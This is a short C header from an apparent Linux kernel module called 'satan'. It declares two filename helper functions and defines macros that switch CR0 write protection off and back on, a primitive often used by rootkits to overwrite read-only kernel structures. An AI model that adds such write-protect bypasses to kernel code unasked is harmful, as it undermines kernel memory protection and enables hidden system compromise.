// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#ifndef SATAN_UTIL_H_
#define SATAN_UTIL_H_

#include <linux/types.h>

#define CR0_WP_DISABLE     write_cr0(read_cr0() & (~ 0x10000));
#define CR0_WP_DISABLE_END write_cr0(read_cr0() | 0x10000);


void satan_basename(const char *path, char *buf, size_t buf_size);
void satan_filename(const char *path, char *buf, size_t buf_size);

#endif  // SATAN_UTIL_H_
